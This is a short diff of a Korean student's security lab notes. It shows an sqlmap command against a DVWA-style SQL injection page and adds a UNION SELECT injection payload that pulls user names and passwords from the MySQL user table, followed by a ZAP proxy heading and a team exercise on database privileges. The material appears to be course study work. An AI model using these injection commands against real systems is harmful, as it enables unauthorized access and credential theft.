@@ -140,7 +140,19 @@ sqlmap -u "http://221.166.254.70/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 ```
 ![[Pasted image 20241016152138.png]]
 
+```
 ' UNION SELECT user, password FROM mysql.user #
-
+```
+![[Pasted image 20241016154233.png]]
 
 ### zap proxy
+![[Pasted image 20241016154201.png]]
+# 팀 과제
+## 요청 사항
+### 사용자 이름과 같은 DB에만 모든 권한 가진다.
+
+### 팀 이름과 같은 DBdp select, desc 권한 가진다.
+### 다른 팀 사용자는 팀 DB에 접속 불가능
+### Test 계정은 모든 권한
+### Test2 계정은 creat, drop rnjsgks(Student_Score)
+### Test2 계정 생성 후 삭제
